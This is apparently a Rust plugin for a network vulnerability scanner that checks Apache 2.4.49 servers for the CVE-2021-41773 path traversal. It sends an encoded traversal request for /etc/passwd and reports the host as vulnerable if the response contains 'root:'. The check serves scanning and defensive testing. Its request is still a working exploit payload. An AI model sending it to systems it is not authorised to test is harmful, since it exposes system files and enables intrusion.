/* http-vuln-cve2021-41773-4 - Apache 2.4.49 path traversal probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
let port = unsafe { (*ctx).port };
let mut resp = String::new();
resp = match http_request(ctx, "GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", None, "", "", None, 8192) {
    Some(r) if !r.is_empty() => r,
    _ => { set_out(ctx, "http-vuln-cve2021-41773-4: no HTTP response"); return 0; }
};
if contains_ci(&resp, "root:") {
    set_out(ctx, &format!("VULNERABLE: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd [{}] (CVE-2021-41773)", http_status(&resp)));
} else {
    set_out(ctx, &format!("not vulnerable: CVE-2021-41773 (/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd [{}])", http_status(&resp)));
}
0
}
